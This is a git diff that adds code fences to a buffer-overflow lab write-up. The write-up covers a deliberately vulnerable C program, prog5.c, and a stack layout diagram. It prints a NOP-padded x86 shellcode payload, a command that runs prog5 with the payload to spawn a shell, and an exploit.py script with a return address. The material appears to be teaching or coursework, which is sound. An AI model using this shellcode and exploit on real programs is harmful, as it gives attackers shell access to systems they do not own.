@@ -7,7 +7,7 @@ Author: Chase Clarke cfclarke@bu.edu
 
 
 # prog5.c source
-
+```
 //compile with $ gcc prog5.c -o prog5
 
 #include <stdio.h>
@@ -41,9 +41,9 @@ int processInput(char *input)
 }
 
 //program accepts two parameters, there is a simple buffer overflow...
+```
 
-
-
+```
 int main(int argc, char **argv)
 {
 		//check arguments
@@ -59,7 +59,7 @@ int main(int argc, char **argv)
 		return 0;
 }
   
-
+```
 
 # ---------- prog5 stack ------------------ #
 
@@ -69,7 +69,7 @@ Stack after 'processInput' is called but before stack pointer returns to main:
 
 Towards BOTTOM of stack - TOP of memory
 
-
+```
 	.           .     
 	.           .     
 	.           .     
@@ -101,7 +101,7 @@ Towards BOTTOM of stack - TOP of memory
 	.           .     
 	.           .     
 	.           .     
-
+```
 
 
 Towards TOP of stack - BOTTOM of memory
@@ -188,16 +188,16 @@ Encoded as '\x90'
 So ===>
 
 You can now write a python script that prints out the shell code at the correct size, padded by the nops:
-
+```
 	`python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89
 		\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
-
+```
 
 you can launch your new shell by running the prog5 executable with the above python script as the input:
-
+```
 	$ prog5 `python -c 'print "\x90"*492 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89
 		\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x60\x4b\xff\xff"'`
-
+```
 
 
 The process of manually creating these python scripts can be tedious. 
@@ -209,7 +209,7 @@ To remedy this you can create a python file (exploit.py) shown below that requir
 
 
 // ---------- exploit.py source ------------------ //
-
+```
 #run with prog5 $(python exploit.py)
 
 #!/usr/bin/env python
@@ -231,3 +231,4 @@ buf = ('\x90' * (buf_len - len(payload))) + payload + struct.pack('<L', ret_addr
 
 #writing to the shell
 sys.stdout.write(buf)
+```
